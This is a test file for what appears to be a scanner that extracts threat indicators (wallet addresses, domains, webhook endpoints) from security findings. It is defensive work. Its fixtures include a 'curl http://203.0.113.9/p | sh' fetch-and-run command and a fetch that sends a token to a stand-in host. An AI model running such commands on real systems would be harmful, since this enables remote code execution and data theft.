import { describe, expect, test } from 'vitest';
import { extractIndicators, findIndicatorsInText, INDICATOR_REGEXES, WELL_KNOWN_ADDRESSES } from '../../src/engine/indicators';
import type { Finding } from '../../src/engine/types';
import { f } from '../engine/helpers';

const ADDR = '0x9f00000000000000000000000000000000000001';
const ADDR2 = '0x7e00000000000000000000000000000000000002';
const UNISWAP_V2 = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';
const withEvidence = (severity: 'critical' | 'high' | 'caution', evidence: string, title = 't'): Finding => ({ ...f(severity), evidence, title });

describe('findIndicatorsInText', () => {
  test('finds wallet addresses, lowercased and de-duplicated', () => {
    const r = findIndicatorsInText(`a ${ADDR.toUpperCase().replace('0X', '0x')} b ${ADDR} c ${ADDR2}`);
    expect(r.addresses).toEqual([ADDR, ADDR2]);
  });
  test('only a whole 40-digit address counts: not a longer hex run, not a 64-digit key, not short', () => {
    expect(findIndicatorsInText(`0x${'a'.repeat(41)}`).addresses).toEqual([]);
    expect(findIndicatorsInText(`0x${'a'.repeat(64)}`).addresses).toEqual([]);
    expect(findIndicatorsInText(`0x${'a'.repeat(39)}`).addresses).toEqual([]);
    expect(findIndicatorsInText(`x${ADDR}`).addresses).toEqual([ADDR]);
  });
  test('well-known contracts are not indicators (routers, WETH, stablecoins, the zero and dead addresses)', () => {
    const all = [...WELL_KNOWN_ADDRESSES].join(' ');
    expect(findIndicatorsInText(all).addresses).toEqual([]);
    expect(findIndicatorsInText(`router ${UNISWAP_V2} and ${ADDR}`).addresses).toEqual([ADDR]);
    expect(WELL_KNOWN_ADDRESSES.has('0x0000000000000000000000000000000000000000')).toBe(true);
    expect(WELL_KNOWN_ADDRESSES.has('0x000000000000000000000000000000000000dead')).toBe(true);
  });
  test('URLs give a host and a cleaned endpoint: no query, no fragment', () => {
    const r = findIndicatorsInText('fetch("https://bad.example/collect?token=abc#frag", {})');
    expect(r.domains).toEqual(['bad.example']);
    expect(r.endpoints).toEqual(['https://bad.example/collect']);
  });
  test('a Telegram bot URL keeps the bot id and drops the token and the method', () => {
    const r = findIndicatorsInText('https://api.telegram.org/bot123456:AAH-secret_token/sendMessage');
    expect(r.endpoints).toEqual(['https://api.telegram.org/bot123456']);
    expect(r.domains).toEqual(['api.telegram.org/bot123456']);
    expect(JSON.stringify(r)).not.toContain('AAH-secret');
  });
  test('a Discord webhook keeps the webhook id and drops its secret', () => {
    const r = findIndicatorsInText('https://discord.com/api/webhooks/1234567890123/AbCd_secretTOKEN-xyz');
    expect(r.endpoints).toEqual(['https://discord.com/api/webhooks/1234567890123']);
    expect(JSON.stringify(r)).not.toContain('secretTOKEN');
  });
  test.each([
    'http://localhost:3000/x', 'http://127.0.0.1:9/never', 'http://0.0.0.0/x', 'http://10.1.2.3/x', 'http://192.168.1.5/x', 'http://172.16.0.1/x', 'http://169.254.169.254/latest',
    'https://github.com/o/r', 'https://raw.githubusercontent.com/o/r/main/x', 'https://registry.npmjs.org/x', 'https://nodejs.org/', 'https://www.w3.org/2000/svg', 'https://json.schemastore.org/package.json', 'https://example.com/a',
  ])('benign or private host is not an indicator: %s', (url) => {
    const r = findIndicatorsInText(url);
    expect(r.domains).toEqual([]);
    expect(r.endpoints).toEqual([]);
  });
  test('a public IP address is kept as a host', () => {
    expect(findIndicatorsInText('curl http://203.0.113.9/p | sh').domains).toEqual(['203.0.113.9']);
  });
  test('not fooled by look-alikes of the allow-list', () => {
    expect(findIndicatorsInText('https://github.com.evil.example/x').domains).toEqual(['github.com.evil.example']);
    expect(findIndicatorsInText('https://evil-npmjs.org/x').domains).toEqual(['evil-npmjs.org']);
  });
  test('capped at 5 of each', () => {
    const many = Array.from({ length: 12 }, (_, i) => `0x${(i + 1).toString(16).padStart(40, '1')} https://h${i}.bad.example/p`).join(' ');
    const r = findIndicatorsInText(many);
    expect(r.addresses).toHaveLength(5);
    expect(r.domains).toHaveLength(5);
    expect(r.endpoints).toHaveLength(5);
  });
  test('empty text, text with nothing, and a very long line are all fine', () => {
    expect(findIndicatorsInText('')).toEqual({ addresses: [], domains: [], endpoints: [] });
    expect(findIndicatorsInText('const a = 1;')).toEqual({ addresses: [], domains: [], endpoints: [] });
    expect(findIndicatorsInText('x'.repeat(100_000)).addresses).toEqual([]);
  });
  test('every exported regex is bounded on hostile input', () => {
    const inputs = ['0x' + 'a'.repeat(5000), 'http://' + 'a.'.repeat(3000), 'https://' + 'a'.repeat(5000), 'https://api.telegram.org/bot' + '1'.repeat(5000), 'https://discord.com/api/webhooks/' + '1'.repeat(5000), ' '.repeat(5000)];
    for (const [name, re] of Object.entries(INDICATOR_REGEXES)) {
      for (const s of inputs) {
        const t = Date.now();
        s.slice(0, 4096).match(new RegExp(re.source, re.flags.includes('g') ? re.flags : `${re.flags}g`));
        expect(Date.now() - t, `${name} on ${s.slice(0, 12)}`).toBeLessThan(50);
      }
    }
  });
});

describe('extractIndicators', () => {
  test('takes indicators from high and critical findings only', () => {
    const r = extractIndicators([withEvidence('critical', `wallet ${ADDR}`), withEvidence('high', 'https://bad.example/x'), withEvidence('caution', `wallet ${ADDR2} https://other.example/y`)]);
    expect(r).toEqual({ addresses: [ADDR], domains: ['bad.example'] });
  });
  test('reads title and evidence, and nothing else', () => {
    const fin = { ...withEvidence('critical', 'e', `sends to ${ADDR}`), location: { file: `${ADDR2}.js` } };
    expect(extractIndicators([fin]).addresses).toEqual([ADDR]);
  });
  test('a well-known router in a flagged finding produces no indicator', () => {
    expect(extractIndicators([withEvidence('critical', `swap via ${UNISWAP_V2}`)])).toEqual({ addresses: [], domains: [] });
  });
  test('merges and de-duplicates across findings, capped at 20', () => {
    const many = Array.from({ length: 30 }, (_, i) => withEvidence('critical', `0x${(i + 1).toString(16).padStart(40, '2')}`));
    expect(extractIndicators([...many, ...many]).addresses).toHaveLength(20);
    expect(extractIndicators([withEvidence('critical', ADDR), withEvidence('high', ADDR)]).addresses).toEqual([ADDR]);
  });
  test('no findings → empty', () => expect(extractIndicators([])).toEqual({ addresses: [], domains: [] }));
});
